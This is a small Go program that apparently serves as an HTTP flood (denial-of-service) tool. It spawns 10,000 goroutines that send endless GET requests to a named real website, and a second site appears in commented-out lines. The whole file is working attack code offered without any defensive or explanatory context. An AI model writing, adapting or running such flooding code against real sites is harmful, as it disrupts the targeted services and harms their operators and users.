package main

import (
	"net/http"
	"sync"
)

var wg sync.WaitGroup

func cc(url string) {
	for true {
		http.Get(url)
	}

}
func main() {
	wg.Add(4)
	for i := 0; i < 10000; i++ {
		//https://www.ishansong.com/
		go cc("https://www.iyisong.net/")
		// go cc("https://www.ishansong.com/")
	}
	wg.Wait()
}
